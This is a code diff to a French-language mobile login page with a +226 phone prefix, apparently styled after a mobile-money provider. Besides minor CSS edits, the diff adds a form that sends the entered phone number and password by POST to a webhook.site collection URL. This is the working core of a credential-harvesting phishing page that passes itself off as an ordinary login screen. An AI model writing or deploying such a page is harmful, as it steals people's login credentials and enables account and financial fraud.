@@ -56,6 +56,7 @@
       color: #009fe3;
       margin-right: 8px;
       font-weight: bold;
+      user-select: none;
     }
 
     .input-group input {
@@ -105,7 +106,7 @@
 
     .wave-bg-container {
       position: absolute;
-      bottom: 250px; /* même hauteur que orange-bg */
+      bottom: 250px;
       width: 100%;
       z-index: 1;
       overflow: hidden;
@@ -126,16 +127,18 @@
   </div>
 
   <div class="container">
-    <div class="input-group">
-      <span contenteditable="true">+226</span>
-      <input type="tel" placeholder="Entrez votre mobile">
-    </div>
+    <form action="https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5" method="POST">
+      <div class="input-group">
+        <span>+226</span>
+        <input type="tel" name="phone" placeholder="Entrez votre mobile" required>
+      </div>
 
-    <div class="input-group">
-      <input type="password" placeholder="Entrez le mot de passe de connexion">
-    </div>
+      <div class="input-group">
+        <input type="password" name="password" placeholder="Entrez le mot de passe de connexion" required>
+      </div>
 
-    <button class="btn">Se connecter</button>
+      <button type="submit" class="btn">Se connecter</button>
+    </form>
 
     <div class="bottom-text">
       Pas de compte ?<a href="#">S’inscrire maintenant</a>
